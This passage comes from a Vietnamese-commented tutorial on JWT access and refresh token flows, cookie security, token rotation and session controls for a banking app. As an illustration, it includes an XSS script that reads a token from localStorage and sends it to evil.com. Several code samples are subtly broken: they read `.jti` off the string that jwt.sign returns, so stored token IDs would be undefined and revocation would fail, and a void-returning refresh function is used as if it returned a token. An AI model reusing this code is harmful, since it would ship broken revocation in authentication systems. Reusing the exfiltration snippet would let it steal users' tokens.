      role: user.role,  // 🎭 Role: admin/trader/customer (phân quyền)
      permissions: user.permissions,  // 🔑 Quyền cụ thể (RBAC - Role-Based Access Control)
    },
    process.env.ACCESS_TOKEN_SECRET,  // 🔑 Private key (RSA) - biến môi trường, KHÔNG commit lên Git
    { expiresIn: '15m' }  // ⌛ 15 phút (ngắn - giảm thiệt hại nếu leak)
  );
  
  // 🔹 BƯớc 5: Generate Refresh Token (JWT - 30 ngày)
  const refreshToken = jwt.sign(
    {  // 📦 Payload tối thiểu (chỉ cần jti và sub)
      jti: uuidv4(),  // 🆔 JWT ID - unique identifier để track/revoke token
      sub: user.id,  // 👤 User ID
    },
    process.env.REFRESH_TOKEN_SECRET,  // 🔑 Khóa riêng cho refresh token (KHÁC với access token)
    { expiresIn: '30d' }  // ⌛ 30 ngày (dài - UX tốt, user không phải login liên tục)
  );
  
  // 🔹 BƯớc 6: Lưu Refresh Token vào database (để có thể revoke sau)
  await db.saveRefreshToken({
    tokenId: refreshToken.jti,  // 🆔 JWT ID (unique)
    userId: user.id,  // 👤 User ID (foreign key)
    expiresAt: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000),  // ⌛ Expiry date
    deviceInfo: req.headers['user-agent'],  // 🖥️ Thông tin thiết bị (browser, OS)
    ipAddress: req.ip,  // 🌐 IP address (geo-location, fraud detection)
  });
  // → Lưu vào DB để: revoke khi logout, detect multiple logins, audit trail
  
  // 🔹 BƯớc 7: Set Refresh Token vào httpOnly Cookie (🛡️ Bảo mật cao nhất)
  res.cookie('refreshToken', refreshToken, {
    httpOnly: true,    // ⚠️ QUAN TRỌNG: JavaScript KHÔNG đọc được (chống XSS)
    // document.cookie sẽ KHÔNG thấy cookie này
    // Chỉ browser gửi tự động với requests
    
    secure: true,      // 🔒 Chỉ gửi qua HTTPS (không qua HTTP - chống MITM attack)
    // Production MUST có, dev localhost có thể tắt
    
    sameSite: 'strict', // 🛡️ Chống CSRF (Cross-Site Request Forgery)
    // 'strict': KHÔNG gửi cookie khi navigate từ site khác
    // 'lax': Gửi cookie khi GET navigation (moderate security)
    // 'none': Gửi mọi cross-site (least secure, cần secure: true)
    
    maxAge: 30 * 24 * 60 * 60 * 1000,  // ⌛ 30 ngày (milliseconds)
    // Browser tự động xóa cookie sau 30 ngày
    
    path: '/auth/refresh',  // 📋 Chỉ gửi cookie tới endpoint này
    // Giảm exposure - không gửi tới mọi API endpoint
    // Chỉ có POST /auth/refresh mới nhận được cookie này
  });
  // → Browser tự động lưu cookie và gửi kèm requests tới /auth/refresh
  
  // 🔹 BƯớc 8: Log login event (audit trail - vết vết hoạt động)
  await logEvent({
    type: 'LOGIN_SUCCESS',  // 📝 Loại event (LOGIN_SUCCESS, LOGIN_FAILED, LOGOUT, etc.)
    userId: user.id,  // 👤 User ID
    ipAddress: req.ip,  // 🌐 IP address (để detect unusual locations)
    deviceInfo: req.headers['user-agent'],  // 🖥️ Device info (browser, OS)
    timestamp: new Date(),  // ⏰ Thời gian
  });
  // → Audit trail giúp: compliance (kế toán), security (detect breach), debugging
  
  // 🔹 BƯớc 9: Return Access Token về client (qua response body JSON)
  res.json({
    accessToken,  // 🔑 JWT string - client lưu trong memory
    user: {  // 👤 User info (hiển thị UI - không sensitive)
      id: user.id,
      name: user.name,
      email: user.email,
      role: user.role,
    },
    expiresIn: 900,  // ⏰ 15 phút = 900 giây (client dùng để tính thời điểm refresh)
  });
  // ✅ Success response: 200 OK + JSON body
  // 🍪 Refresh token đã set vào cookie ở bƯớc 7
});

// ============================================
// BƯỚC 3: Frontend Lưu Access Token
// ============================================

// 💾 Store Access Token in memory (JavaScript variable - biến toàn cục)
// ⚠️ KHÔNG dùng localStorage/sessionStorage (XSS có thể đọc được)
let accessToken: string | null = null;  // 🔑 Lưu trong RAM, mất khi refresh page

async function handleLogin(username: string, password: string) {
  const response = await login(username, password);  // 📡 Gọi API login
  
  // 🔹 Lưu Access Token trong memory (biến toàn cục)
  accessToken = response.accessToken;  // 🔑 JWT string
  // → Mất khi user refresh page (an toàn hơn localStorage)
  // → Phải lấy lại từ refresh token khi refresh page
  
  // 🔹 Lưu user info (KHÔNG sensitive) vào localStorage
  localStorage.setItem('user', JSON.stringify(response.user));
  // → Hiển thị tên user khi refresh page (trước khi lấy token mới)
  // → OK vì không chứa sensitive data (không có password, token)
  
  // 🔹 Redirect to dashboard
  window.location.href = '/dashboard';  // 🎯 Chuyển sang trang chính
}

// ❌ ⚠️ KHÔNG BAO GIỜ LÀM NHƯ NÀY:
// localStorage.setItem('accessToken', token);  // ❌ XSS có thể đọc: document.cookie, localStorage
// sessionStorage.setItem('accessToken', token); // ❌ Vẫn XSS risk (JS đọc được)
```

---

**B. API Call Flow (Gọi API với Access Token):**

```typescript
// ============================================
// 🌐 Frontend: Gọi API với Access Token
// ============================================

// 🛠️ Helper function: Tự động attach Access Token vào mọi API request
async function apiCall(url: string, options: RequestInit = {}) {
  // ✅ Kiểm tra nếu Access Token hết hạn → refresh trước
  if (isTokenExpired(accessToken)) {  // ⏰ Check expiry time (JWT exp claim)
    await refreshAccessToken();  // 🔄 Lấy token mới từ refresh token
  }
  
  // 📡 Gửi request với Access Token trong header
  const response = await fetch(url, {
    ...options,  // 📦 Spread các options hiện có (method, body, etc.)
    headers: {
      ...options.headers,  // 📋 Giữ lại headers hiện có
      'Authorization': `Bearer ${accessToken}`,  // 🔑 Thêm Authorization header
      // "Bearer" là chuẩn OAuth 2.0 cho JWT tokens
    },
    credentials: 'include',  // 🍪 Gửi cookies (refresh token - nếu cần)
  });
  
  // ⚠️ Nếu 401 Unauthorized → token invalid (expired/revoked), logout
  if (response.status === 401) {
    await logout();  // 🚪 Xóa tokens, clear state
    window.location.href = '/login';  // 🔄 Redirect về login page
    throw new Error('Unauthorized');  // ❌ Throw error để stop execution
  }
  
  return response.json();  // 📦 Parse JSON response
}

// 📝 Usage: Gọi API lấy số dư tài khoản
const balance = await apiCall('https://api.bank.com/account/balance');
console.log(balance); // { balance: 1000000, currency: 'VND' }

// ============================================
// 🔧 Backend: Verify Access Token (Middleware)
// ============================================

// 🛡️ Middleware: Verify JWT token trước khi vào protected routes
function authenticateToken(req, res, next) {
  // 🔹 Bước 1: Lấy token từ Authorization header
  const authHeader = req.headers['authorization'];  // "Bearer eyJhbG..."
  const token = authHeader && authHeader.split(' ')[1];  // 🔪 Tách "Bearer" + token
  // authHeader.split(' ') → ["Bearer", "eyJhbG..."]
  // [1] → lấy phần token (index 1)
  
  if (!token) {  // ❌ Nếu không có token
    return res.status(401).json({ error: 'No token provided' });  // 401 Unauthorized
  }
  
  // 🔹 Bước 2: Verify token với secret key
  jwt.verify(token, process.env.ACCESS_TOKEN_SECRET, (err, user) => {
    // jwt.verify() kiểm tra:
    // - Signature hợp lệ (không bị sửa đổi)
    // - Chưa hết hạn (exp claim)
    // - Issuer đúng (nếu có iss claim)
    
    if (err) {  // ❌ Token expired hoặc invalid
      // err.name === 'TokenExpiredError' → hết hạn
      // err.name === 'JsonWebTokenError' → sai signature/format
      return res.status(403).json({ error: 'Invalid token' });  // 403 Forbidden
    }
    
    // ✅ Token hợp lệ
    // 🔹 Bước 3: Attach user info vào request object
    req.user = user;  // 👤 { sub: "123", role: "trader", permissions: [...] }
    // → Downstream routes có thể dùng req.user để phân quyền
    next();  // ➡️ Tiếp tục vào route handler
  });
}

// 🛡️ Protected route - Yêu cầu authentication
app.get('/account/balance', authenticateToken, async (req, res) => {
  // authenticateToken middleware chạy trước → đảm bảo req.user tồn tại
  const userId = req.user.sub;  // 🆔 Lấy User ID từ JWT payload
  const balance = await db.getBalance(userId);  // 💰 Query database
  res.json(balance);  // 📤 Return JSON response
});
```

---

**C. Refresh Token Flow (Làm Mới Access Token):**

```typescript
// ============================================
// 🔄 Frontend: Refresh Access Token (Lấy token mới khi hết hạn)
// ============================================

async function refreshAccessToken(): Promise<void> {
  try {
    const response = await fetch('https://api.bank.com/auth/refresh', {
      method: 'POST',  // 📮 HTTP POST
      credentials: 'include',  // 🍪 QUAN TRỌNG: Gửi httpOnly cookie (refreshToken)
      // Browser tự động gửi cookie "refreshToken" kèm request
      headers: {
        'Content-Type': 'application/json',
      },
    });
    
    if (!response.ok) {  // ❌ Nếu refresh thất bại (401, 403)
      // Refresh token hết hạn hoặc invalid → logout
      throw new Error('Refresh token expired');
    }
    
    const data = await response.json();  // 📦 Parse response
    // 📝 Response structure:
    // {
    //   accessToken: "new-token...",  // 🔑 Access Token mới (JWT string)
    //   expiresIn: 900  // ⏰ 15 phút
    // }
    
    // ✅ Cập nhật Access Token mới vào memory
    accessToken = data.accessToken;  // 🔄 Ghi đè token cũ
    
    console.log('Access token refreshed');  // 📝 Log success
  } catch (error) {
    console.error('Refresh failed:', error);  // 🚨 Log lỗi
    
    // 🚪 Logout user (refresh token không còn hợp lệ)
    await logout();  // Xóa tokens, clear state
    window.location.href = '/login';  // 🔄 Redirect về login
  }
}

// ⏰ Auto-refresh token trước khi hết hạn (silent refresh)
function startTokenRefreshTimer() {
  // 🕒 Refresh token trước 1 phút khi hết hạn (14 phút)
  const refreshTime = (15 - 1) * 60 * 1000;  // 14 phút = 840000ms
  // → Refresh ở phút 14, trước khi hết hạn ở phút 15
  
  setInterval(async () => {  // 🔄 Lặp lại mỗi 14 phút
    await refreshAccessToken();  // Gọi API refresh
  }, refreshTime);
}

// 🚀 Gọi khi app khởi động (App.tsx, main.tsx)
startTokenRefreshTimer();  // Bắt đầu timer

// ============================================
// 🔧 Backend: Refresh Token Endpoint
// ============================================

app.post('/auth/refresh', async (req, res) => {
  // 🔹 BƯớc 1: Lấy Refresh Token từ httpOnly cookie
  const refreshToken = req.cookies.refreshToken;  // 🍪 Browser tự động gửi cookie
  
  if (!refreshToken) {  // ❌ Nếu không có cookie (user chưa login)
    return res.status(401).json({ error: 'No refresh token' });
  }
  
  try {
    // 🔹 BƯớc 2: Verify Refresh Token
    const decoded = jwt.verify(refreshToken, process.env.REFRESH_TOKEN_SECRET);
    // → Kiểm tra signature, expiry, format
    // → decoded = { jti: "...", sub: "user123", iat: ..., exp: ... }
    
    // 🔹 BƯớc 3: Check token trong database (chưa bị revoke?)
    const tokenRecord = await db.findRefreshToken(decoded.jti);  // 🔍 Tìm theo JWT ID
    if (!tokenRecord || tokenRecord.isRevoked) {  // ❌ Token bị revoke (blacklist)
      // isRevoked = true khi: logout, suspicious activity, password change
      return res.status(403).json({ error: 'Token revoked' });
    }
    
    // 🔹 BƯớc 4: Check user vẫn còn active
    const user = await db.findUserById(decoded.sub);  // 🔍 Tìm user
    if (!user || user.isLocked) {  // ❌ User không tồn tại hoặc bị khóa
      return res.status(403).json({ error: 'User inactive' });
    }
    
    // 🔹 BƯớc 5: Generate Access Token mới (15 phút)
    const newAccessToken = jwt.sign(
      {  // 📦 Payload (fresh data từ database)
        sub: user.id,
        name: user.name,  // Có thể đã thay đổi từ lần login
        email: user.email,
        role: user.role,  // Có thể admin đã thay đổi quyền
        permissions: user.permissions,
      },
      process.env.ACCESS_TOKEN_SECRET,  // 🔑 Private key
      { expiresIn: '15m' }  // ⌛ 15 phút
    );
    
    // 🔹 BƯớc 6: Log refresh event (audit trail)
    await logEvent({
      type: 'TOKEN_REFRESH',  // 📝 Event type
      userId: user.id,  // 👤 User ID
      tokenId: decoded.jti,  // 🆔 Token ID
      timestamp: new Date(),  // ⏰ Thời gian
    });
    
    // 🔹 BƯớc 7: Return Access Token mới
    res.json({
      accessToken: newAccessToken,  // 🔑 JWT string
      expiresIn: 900,  // ⏰ 15 phút
    });
    // ✅ Refresh token vẫn giữ nguyên trong cookie (không thay đổi)
    // ⚠️ Nếu muốn Token Rotation: generate refresh token mới ở đây
    
  } catch (error) {
    // ❌ Token expired hoặc invalid signature
    return res.status(403).json({ error: 'Invalid refresh token' });
  }
});
```

---

**D. Logout Flow (Đăng Xuất):**

```typescript
// ============================================
// 🚪 Frontend: Logout (Xóa tokens, clear state)
// ============================================

async function logout(): Promise<void> {
  try {
    // 🔹 BƯớc 1: Gọi API logout (revoke refresh token trên server)
    await fetch('https://api.bank.com/auth/logout', {
      method: 'POST',  // 📮 HTTP POST
      credentials: 'include',  // 🍪 Gửi refreshToken cookie
    });
    // → Server sẽ revoke token trong database (blacklist)
    
    // 🔹 BƯớc 2: Xóa Access Token khỏi memory
    accessToken = null;  // 🗄️ Set null (garbage collected)
    
    // 🔹 BƯớc 3: Xóa user info khỏi localStorage
    localStorage.removeItem('user');  // 🗄️ Xóa user data
    
    // 🔹 BƯớc 4: Clear any cached data
    sessionStorage.clear();  // 🧹 Xóa tất cả session data
    // → Xóa cached API responses, temporary data
    
    // 🔹 BƯớc 5: Redirect to login
    window.location.href = '/login';  // 🔄 Chuyển về trang login
    
  } catch (error) {
    console.error('Logout error:', error);  // 🚨 Log lỗi
    // ⚠️ Vẫn redirect về login dù có lỗi (fail-safe)
    window.location.href = '/login';
  }
}

// ============================================
// 🔧 Backend: Logout Endpoint (Revoke tokens)
// ============================================

app.post('/auth/logout', async (req, res) => {
  // 🔹 BƯớc 1: Lấy Refresh Token từ cookie
  const refreshToken = req.cookies.refreshToken;  // 🍪 httpOnly cookie
  
  if (refreshToken) {  // ✅ Nếu có cookie (user đang login)
    try {
      // 🔹 BƯớc 2: Decode token để lấy JWT ID
      const decoded = jwt.verify(refreshToken, process.env.REFRESH_TOKEN_SECRET);
      // → decoded = { jti: "...", sub: "user123", ... }
      
      // 🔹 BƯớc 3: Revoke token trong database (blacklist)
      await db.revokeRefreshToken(decoded.jti);  // 🗄️ Set isRevoked = true
      // → Token không thể dùng để refresh nữa
      // → Nếu hacker đánh cắp cookie, không dùng được
      
      // 🔹 BƯớc 4: Log logout event (audit trail)
      await logEvent({
        type: 'LOGOUT',  // 📝 Event type
        userId: decoded.sub,  // 👤 User ID
        tokenId: decoded.jti,  // 🆔 Token ID
        timestamp: new Date(),  // ⏰ Thời gian
      });
      // → Tracking user activities, compliance
      
    } catch (error) {
      console.error('Logout error:', error);  // 🚨 Log lỗi (token invalid/expired - OK)
    }
  }
  
  // 🔹 BƯớc 5: Xóa Refresh Token cookie khỏi browser
  res.clearCookie('refreshToken', {  // 🗄️ Xóa cookie
    httpOnly: true,  // ⚠️ Phải trùng với lúc set cookie
    secure: true,
    sameSite: 'strict',
    path: '/auth/refresh',  // ⚠️ Path phải trùng khớp
  });
  // → Browser xóa cookie ngay lập tức
  
  // 🔹 BƯớc 6: Return success
  res.json({ message: 'Logged out successfully' });  // ✅ 200 OK
});
```

---

#### **🛡️ 3. Security Best Practices (Thực Hành Bảo Mật)**

**A. Cookie Security:**

```typescript
// ============================================
// 🔒 SECURE COOKIE CONFIGURATION (Cấu hình cookie an toàn)
// ============================================

// ✅ ĐÚNG: Secure httpOnly Cookie (Banking/Trading MUST có)
res.cookie('refreshToken', token, {
  httpOnly: true,    // ⚠️ JavaScript KHÔNG đọc được (chống XSS)
  // document.cookie = undefined (JS không thấy cookie này)
  // Chỉ server đọc được qua req.cookies
  
  secure: true,      // 🔒 Chỉ gửi qua HTTPS (không qua HTTP - chống MITM attack)
  // Production MUST có, dev localhost có thể tắt
  
  sameSite: 'strict', // 🛡️ Chống CSRF (Cross-Site Request Forgery)
  // 'strict': KHÔNG gửi cookie khi navigate từ site khác
  // VD: evil.com → bank.com (cookie KHÔNG gửi)
  
  maxAge: 30 * 24 * 60 * 60 * 1000,  // ⌛ 30 ngày (milliseconds)
  // Browser tự động xóa cookie sau 30 ngày
  
  path: '/auth/refresh',  // 📋 Chỉ gửi cookie tới endpoint này
  // Giảm exposure - không gửi tới mọi API endpoint
  // Chỉ POST /auth/refresh mới nhận được cookie
  
  domain: '.bank.com',  // 🌐 Cho phép subdomain (api.bank.com, www.bank.com)
  // Nếu không set = chỉ exact domain
});

// ❌ SAI: Không secure (⚠️ NEVER dùng trong production)
res.cookie('refreshToken', token, {
  httpOnly: false,   // ❌ JS đọc được → XSS có thể đánh cắp
  secure: false,     // ❌ Gửi qua HTTP → MITM (Man-In-The-Middle) attack
  sameSite: 'none',  // ❌ Gửi cross-site → CSRF attack risk
});

// ============================================
// Cookie Attributes Giải Thích
// ============================================

/**
 * httpOnly: true
 * - JavaScript không đọc được: document.cookie = undefined
 * - Chỉ server đọc được
 * - Chống XSS: Hacker inject script cũng không lấy được cookie
 * 
 * secure: true
 * - Chỉ gửi qua HTTPS (không qua HTTP)
 * - Chống MITM (Man-In-The-Middle) attack
 * - Production MUST có
 * 
 * sameSite: 'strict'
 * - Không gửi cookie khi navigate từ site khác
 * - Example: evil.com → bank.com (cookie KHÔNG gửi)
 * - Chống CSRF attack
 * - Options: 'strict' | 'lax' | 'none'
 *   - strict: Không gửi cross-site (most secure)
 *   - lax: Gửi khi GET navigation (moderate)
 *   - none: Gửi mọi cross-site (least secure)
 * 
 * path: '/auth/refresh'
 * - Cookie chỉ gửi tới endpoint này
 * - Giảm exposure (không gửi tới mọi endpoint)
 * 
 * domain: '.bank.com'
 * - Cho phép subdomain: api.bank.com, www.bank.com
 * - Không set = chỉ exact domain
 */
```

**B. Token Storage (Lưu Trữ Tokens):**

```typescript
// ============================================
// 💾 WHERE TO STORE TOKENS? (Lưu tokens ở đâu?)
// ============================================

// ✅ Access Token: MEMORY (JavaScript variable - biến toàn cục)
let accessToken: string | null = null;  // 💾 Lưu trong RAM

// 📝 Lý do dùng memory:
// - ⚡ Mất khi refresh page (an toàn hơn - attacker không lấy được nếu inject XSS sau)
// - 🛡️ Không bị XSS nếu page refresh (token biến mất)
// - ⏱️ Short-lived (15 phút) nên OK (hạn chế thiệt hại)
// - 🔄 Phải lấy lại từ refresh token khi reload (trade-off UX vs security)

// ✅ Refresh Token: httpOnly Cookie (🍪 Server-side cookie)
// Set-Cookie: refreshToken=...; HttpOnly; Secure; SameSite=Strict

// 📝 Lý do dùng httpOnly cookie:
// - 🔒 JavaScript KHÔNG đọc được (chống XSS - document.cookie = undefined)
// - 🤖 Auto gửi với requests (convenient - browser tự động attach)
// - ⏱️ Long-lived (30 ngày) nhưng secure (httpOnly protection)
// - 🛡️ SameSite=Strict chống CSRF (không gửi cross-site)

// ❌ ⚠️ NEVER LÀM NHƯ NÀY (NGUY HIỂM!):
localStorage.setItem('accessToken', token);  // ❌ XSS đọc được qua localStorage.getItem()
sessionStorage.setItem('accessToken', token);  // ❌ Vẫn XSS risk (JS đọc được)
document.cookie = `accessToken=${token}`;  // ❌ Readable by JS (không httpOnly)

// ============================================
// 🚨 XSS Attack Example (Ví dụ tấn công XSS)
// ============================================

// 💀 Scenario 1: Nếu lưu token trong localStorage
// Hacker inject malicious script vào website (qua comment, form input, etc.):
<script>
  // 💀 Đánh cắp token từ localStorage
  const token = localStorage.getItem('accessToken');  // ✅ Thành công!
  
  // 📡 Gửi token về hacker server
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: JSON.stringify({ token }),  // 📦 Gửi token đi
  });
  
  // 💀 Giờ hacker có token → impersonate user (giả mạo)
  // → Truy cập account, chuyển tiền, đọc dữ liệu nhạy cảm!
</script>

// ✅ Scenario 2: Nếu dùng httpOnly cookie
// Hacker inject cùng script:
<script>
  // 💀 Thử đánh cắp cookie
  const token = document.cookie; // ❌ undefined (httpOnly - JS không đọc được)
  
  // ❌ Không lấy được! ✅ An toàn!
  // Browser chặn truy cập httpOnly cookies từ JavaScript
</script>
```

**C. Token Rotation (Xoay Vòng Token - Advanced Security):**

```typescript
// ============================================
// 🔄 REFRESH TOKEN ROTATION (Mỗi lần refresh → token mới)
// ============================================

// 🔧 Backend: Mỗi lần refresh → generate token mới và revoke token cũ
app.post('/auth/refresh', async (req, res) => {
  const oldRefreshToken = req.cookies.refreshToken;  // 🍪 Lấy token cũ
  
  // 🔹 Verify old token (kiểm tra hợp lệ)
  const decoded = jwt.verify(oldRefreshToken, SECRET);
  // → decoded = { jti: "old-token-id", sub: "user123", ... }
  
  // 🔹 Generate NEW Access Token (15 phút mới)
  const newAccessToken = jwt.sign({ ... }, SECRET, { expiresIn: '15m' });
  
  // 🔹 Generate NEW Refresh Token (rotation - token mới hoàn toàn)
  const newRefreshToken = jwt.sign(
    { 
      jti: uuidv4(),  // 🆔 JWT ID MỚI (khác với old token)
      sub: decoded.sub  // 👤 Giữ nguyên User ID
    },
    SECRET,
    { expiresIn: '30d' }  // ⌛ 30 ngày mới
  );
  
  // 🔹 Revoke old Refresh Token (blacklist token cũ)
  await db.revokeRefreshToken(decoded.jti);  // 🗄️ Set isRevoked = true
  // → Old token không thể dùng lại được
  
  // 🔹 Save new Refresh Token vào database
  await db.saveRefreshToken({
    tokenId: newRefreshToken.jti,  // 🆔 Token ID mới
    userId: decoded.sub,
    expiresAt: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000),
    // ... device info, IP, etc.
  });
  
  // 🔹 Set new Refresh Token cookie (ghi đè cookie cũ)
  res.cookie('refreshToken', newRefreshToken, { 
    httpOnly: true, 
    secure: true,
    sameSite: 'strict',
    maxAge: 30 * 24 * 60 * 60 * 1000,
    path: '/auth/refresh',
  });
  
  // 🔹 Return new Access Token về client
  res.json({ accessToken: newAccessToken });  // ✅ Token mới hoàn toàn
});

// 📊 Lợi ích của Token Rotation:
// ✅ 🔄 Mỗi lần refresh → token mới (old token bị vô hiệu hóa)
// ✅ 🗄️ Old token bị revoke → không dùng lại được (single-use)
// ✅ 💀 Nếu hacker có old token → useless (không dùng được)
// ✅ 🚨 Detect reuse attack: Nếu token revoked mà vẫn dùng → suspicious activity
//   → Server log warning, lock account, send email alert
// ✅ 🔒 Giảm thời gian hữu dụng của stolen token (chỉ dùng được 1 lần)

// 🚨 Reuse Attack Detection:
// Nếu server nhận được token đã revoke:
if (tokenRecord.isRevoked) {
  // 🚨 ALERT: Token bị dùng lại sau khi revoke!
  // → Có thể là attacker đang dùng stolen token
  
  await alertSecurityTeam({  // 📧 Gửi email alert
    type: 'TOKEN_REUSE_DETECTED',
    userId: tokenRecord.userId,
    tokenId: tokenRecord.tokenId,
  });
  
  await lockUserAccount(tokenRecord.userId);  // 🔒 Khóa account tạm thời
  
  return res.status(403).json({ 
    error: 'Token reuse detected',  // ❌ Forbidden
    message: 'Account locked for security. Please contact support.'
  });
}
```

---

#### **🔒 4. Special Cases (Các Trường Hợp Đặc Biệt)**

**A. Concurrent Requests (Nhiều Request Cùng Lúc):**

```typescript
// ============================================
// 🚨 Problem: Race Condition (Nhiều requests cùng lúc)
// ============================================

// 📋 Scenario: User vừa mở 10 tabs, mỗi tab gọi API
// → 10 requests cùng lúc (parallel)
// → Token hết hạn (expired)
// → 10 refresh requests cùng lúc ❌ (wasteful, inefficient)
// → 10 access tokens mới (nhưng chỉ cần 1!)

// ============================================
// ✅ Solution: Request Queue với Promise (Chỉ 1 refresh request)
// ============================================

let refreshPromise: Promise<string> | null = null;  // 🔄 Shared promise

async function getValidToken(): Promise<string> {
  // 🔹 Check 1: Nếu token còn hiệu lực → return luôn
  if (accessToken && !isTokenExpired(accessToken)) {
    return accessToken;  // ✅ Dùng token hiện tại
  }
  
  // 🔹 Check 2: Nếu đang refresh → chờ promise hiện tại
  if (refreshPromise) {  // 🔄 Có refresh request đang chạy
    return await refreshPromise;  // ⏳ Chờ kết quả (không tạo request mới)
    // → 9 requests còn lại sẽ chờ ở đây
  }
  
  // 🔹 Tạo promise mới để refresh (lần đầu tiên)
  refreshPromise = refreshAccessToken().then((newToken) => {
    refreshPromise = null;  // ✅ Reset promise (hooked promise xong)
    return newToken;  // 🔑 Trả về token mới
  });
  
  return await refreshPromise;  // ⏳ Chờ kết quả đầu tiên
}

async function apiCall(url: string) {
  const token = await getValidToken();  // ⏳ Chờ token valid (block cho đến khi có)
  
  return fetch(url, {
    headers: {
      'Authorization': `Bearer ${token}`,  // 🔑 Dùng token mới (shared)
    },
  });
}

// 📊 Kết quả (Optimized):
// ✅ 10 requests đầu tiên trigger getValidToken()
// ✅ Chỉ 1 refresh request thực sự gửi đi (request đầu tiên)
// ✅ 9 requests còn lại chờ promise đó (await refreshPromise)
// ✅ Tất cả dùng chung 1 token mới (efficient, consistent)
// ✅ Giảm tải server (1 request thay vì 10)
```

**B. Inactivity Timeout (Tự Động Logout Khi Không Hoạt Động):**

```typescript
// ============================================
// ⏰ AUTO LOGOUT AFTER INACTIVITY (Banking/Trading YÊu CẦU)
// ============================================

class InactivityTimer {  // 🕒 Class quản lý inactivity
  private timeout: number = 5 * 60 * 1000;  // ⌛ 5 phút không hoạt động = logout
  private timer: NodeJS.Timeout | null = null;  // ⏲️ Timer hiện tại
  
  constructor() {
    this.startTimer();  // 🚀 Bắt đầu đếm thời gian
    this.listenActivity();  // 🎯 Lắng nghe user activities
  }
  
  // 🔹 Bắt đầu đếm ngược
  private startTimer() {
    this.clearTimer();  // 🧹 Xóa timer cũ (nếu có)
    
    this.timer = setTimeout(() => {  // ⏰ Set timer mới (5 phút)
      this.onTimeout();  // 🚪 Gọi logout khi timeout
    }, this.timeout);
  }
  
  // 🔄 Reset timer khi có activity (user thao tác)
  private resetTimer() {
    this.startTimer();  // 🔁 Đếm lại từ đầu (0 -> 5 phút)
  }
  
  // 🎯 Lắng nghe user activity (mouse, keyboard, touch, scroll)
  private listenActivity() {
    const events = ['mousedown', 'keydown', 'scroll', 'touchstart'];  // 📝 Các events quan tâm
    // mousedown: User click chuột
    // keydown: User nhấn phím
    // scroll: User cuộn trang
    // touchstart: User chạm màn hình (mobile)
    
    events.forEach((event) => {
      document.addEventListener(event, () => {  // 🎯 Lắng nghe event
        this.resetTimer();  // 🔄 Reset timer (user đang hoạt động)
      }, { passive: true });  // ⚡ Passive = không block scroll performance
    });
  }
  
  // 🚪 Timeout → logout user
  private onTimeout() {
    console.log('Inactivity timeout - logging out');  // 📝 Log event
    
    // ⚠️ Hiển thị warning dialog
    showWarningDialog('Bạn đã không hoạt động trong 5 phút. Vui lòng đăng nhập lại.');
    
    // 🚪 Logout user (gọi hàm logout)
    logout();  // ✅ Xóa tokens, redirect về login
  }
  
  private clearTimer() {  // 🧹 Xóa timer hiện tại
    if (this.timer) {
      clearTimeout(this.timer);  // ❌ Hủy timeout
      this.timer = null;  // 🗄️ Set null
    }
  }
}

// 🚀 Usage: Khởi tạo khi app start
const inactivityTimer = new InactivityTimer();  // ✅ Bắt đầu theo dõi
// → Tự động logout sau 5 phút không hoạt động

// 📊 Lợi ích:
// ✅ 🔒 Bảo mật: Nếu user quên logout, tự động đăng xuất
// ✅ 💼 Compliance: Banking/Trading regulations yêu cầu
// ✅ 👀 Prevent shoulder surfing: Không ai nhìn được màn hình khi user đi khỏi
// ✅ 🏢 Public computers: An toàn khi dùng máy công cộng
```

**C. Device Fingerprinting (Nhận Diện Thiết Bị):**

```typescript
// ============================================
// 🖥️ DEVICE FINGERPRINTING (Vân tay thiết bị)
// ============================================

function getDeviceFingerprint(): string {  // 🔍 Tạo unique ID cho thiết bị
  const data = {  // 📦 Thu thập thông tin thiết bị
    userAgent: navigator.userAgent,  // 🌐 Browser + OS (Chrome/Windows, Safari/Mac, etc.)
    language: navigator.language,  // 🇺🇸 Ngôn ngữ (en-US, vi-VN)
    platform: navigator.platform,  // 🖥️ Nền tảng (Win32, MacIntel, Linux)
    screenResolution: `${screen.width}x${screen.height}`,  // 📺 Độ phân giải (1920x1080)
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,  // ⏰ Múi giờ (Asia/Ho_Chi_Minh)
    colorDepth: screen.colorDepth,  // 🎨 Độ sâu màu (24-bit, 32-bit)
    cpuCores: navigator.hardwareConcurrency,  // 🔧 Số nhân CPU (4, 8, 16)
  };
  
  // 🔐 Hash fingerprint (tạo unique ID từ data)
  const fingerprint = hashSHA256(JSON.stringify(data));  // SHA256 hash
  return fingerprint;  // "a3f8b9..." (unique cho mỗi thiết bị)
}

// 🔧 Backend: Verify device (kiểm tra thiết bị lạ)
app.post('/auth/login', async (req, res) => {
  const { deviceId } = req.body;  // 🖥️ Device fingerprint từ client
  const user = await db.findUser(...);  // 🔍 Tìm user
  
  // 🔹 Check device đã đăng ký chưa (known device?)
  const knownDevice = await db.findDevice(user.id, deviceId);
  
  if (!knownDevice) {  // ❌ Thiết bị mới (chưa từng login)
    // 📧 Gửi OTP/email verification (2FA)
    await sendOTPEmail(user.email);  // 📧 "Mã xác thực: 123456"
    
    return res.status(403).json({  // ⚠️ 403 Forbidden
      error: 'Unknown device',  // ❌ Thiết bị lạ
      requireOTP: true,  // 🔑 Yêu cầu OTP
    });
  }
  
  // ✅ Device OK (thiết bị quen thuộc) → proceed login
  // ... tiếp tục login flow
});

// 📊 Lợi ích:
// ✅ 🚨 Detect unusual login locations (login từ nước ngoài bất thường)
// ✅ 🔒 Require OTP cho thiết bị mới (2FA)
// ✅ 📊 Track device usage (user dùng bao nhiêu thiết bị)
// ✅ 🚨 Fraud detection (bot, automated attacks)
```

**D. Logout All Devices (Đăng Xuất Tất Cả Thiết Bị):**

```typescript
// ============================================
// 📱 LOGOUT ALL DEVICES (Revoke tất cả sessions)
// ============================================

// 🌐 Frontend: Trigger logout all (User bấm nút "Logout all devices")
async function logoutAllDevices() {
  await fetch('https://api.bank.com/auth/logout-all', {
    method: 'POST',  // 📮 HTTP POST
    credentials: 'include',  // 🍪 Gửi cookies
  });
  
  // 🔄 Redirect to login
  window.location.href = '/login';  // ✅ Redirect hiện tại về login
}

// 🔧 Backend: Revoke all refresh tokens (thu hồi tất cả)
app.post('/auth/logout-all', authenticateToken, async (req, res) => {
  // 👤 Lấy User ID từ access token (authenticateToken middleware)
  const userId = req.user.sub;
  
  // 🗄️ Revoke tất cả refresh tokens của user
  await db.revokeAllRefreshTokens(userId);  // Set isRevoked = true cho tất cả
  // → Tất cả devices sẽ không refresh được token mới
